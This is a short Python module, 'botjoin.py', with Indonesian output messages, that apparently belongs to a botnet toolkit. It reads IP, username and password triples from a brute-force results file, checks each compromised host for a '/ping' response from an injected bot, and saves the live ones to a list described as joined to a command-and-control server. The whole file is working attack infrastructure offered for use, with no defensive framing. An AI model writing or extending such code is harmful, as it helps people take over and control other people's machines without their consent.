# botjoin.py
import requests
from colorama import Fore

def run_botjoin():
    print(Fore.YELLOW + "\n[JOIN] Menghubungkan semua bot hasil inject ke C2...")

    try:
        with open("brute_results.txt", "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "[X] File brute_results.txt tidak ditemukan!")
        return []

    bots = []

    for line in lines:
        try:
            ip, user, passwd = line.strip().split("|")
        except:
            continue

        try:
            # Default C2 Port bot = 80, endpoint '/ping' untuk cek
            url = f"http://{ip}/ping"
            r = requests.get(url, timeout=3)

            if r.status_code == 200 and "pong" in r.text.lower():
                bots.append(ip)
                print(Fore.GREEN + f"[✓] Bot aktif di {ip}")
            else:
                print(Fore.MAGENTA + f"[!] Tidak merespon dari {ip}")
        except:
            print(Fore.RED + f"[X] Gagal ping ke {ip}")

    if bots:
        with open("bots.txt", "w") as f:
            for b in bots:
                f.write(b + "\n")
        print(Fore.CYAN + f"[✓] {len(bots)} bot aktif, disimpan ke bots.txt ✔")
    else:
        print(Fore.RED + "[!] Tidak ada bot aktif ditemukan.")

    return bots
